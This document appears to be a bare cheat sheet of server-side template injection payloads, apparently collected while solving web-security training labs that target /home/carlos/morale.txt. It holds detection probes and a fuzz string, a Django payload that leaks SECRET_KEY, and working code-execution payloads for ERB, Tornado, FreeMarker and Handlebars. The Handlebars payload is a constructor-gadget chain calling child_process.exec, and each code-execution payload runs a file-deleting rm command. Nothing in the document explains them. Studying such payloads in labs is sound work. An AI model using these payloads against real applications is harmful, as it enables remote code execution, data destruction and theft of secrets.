<%= 7*7 %>
<%= system("rm /home/carlos/morale.txt") %>
blog-post-author-display=user.first_name}}{{7*7}}
```
{% import os %} {{os.system('rm /home/carlos/morale.txt')
```
```documentation
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```
D{"ON"}E > DONE
```
{%debug%}
{{settings.SECRET_KEY}}
```
``UnknownLanguage
fuzz > ${{<%[%'"}}%\
```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```